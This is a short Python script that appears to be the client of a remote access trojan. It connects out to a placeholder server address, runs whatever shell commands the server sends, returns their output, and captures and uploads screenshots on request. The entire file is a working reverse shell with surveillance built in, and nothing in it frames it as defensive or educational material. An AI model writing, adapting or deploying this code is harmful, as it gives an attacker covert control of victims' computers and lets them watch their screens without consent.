import socket
import os
import subprocess
from PIL import ImageGrab
import io

BUFFER_SIZE = 4096  # 4KB chunks

def send_large_file(client_socket, file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()

        # Send the file size first (4 bytes, big-endian)
        file_size = len(file_data)
        client_socket.send(file_size.to_bytes(4, byteorder='big'))

        # Now send the actual file data
        client_socket.sendall(file_data)
    except Exception as e:
        print(f"An error occurred while sending the file: {e}")

def execute_command(command):
    try:
        if command == "screenshot":
            screenshot = ImageGrab.grab()
            screenshot.save("screenshot.png", format="PNG")
            return "screenshot.png"
        else:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
            return output.decode()
    except Exception as e:
        return str(e).encode()

def main():
    host = "X.X.X.X"  # The server IP address
    port = 8888 # The server listening port

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == "exit":
            break
        result = execute_command(command)
        if command == "screenshot":
            send_large_file(client_socket, "screenshot.png")  # Update with the desired file path
        else:
            client_socket.send(result.encode())

    client_socket.close()

if __name__ == "__main__":
    main()
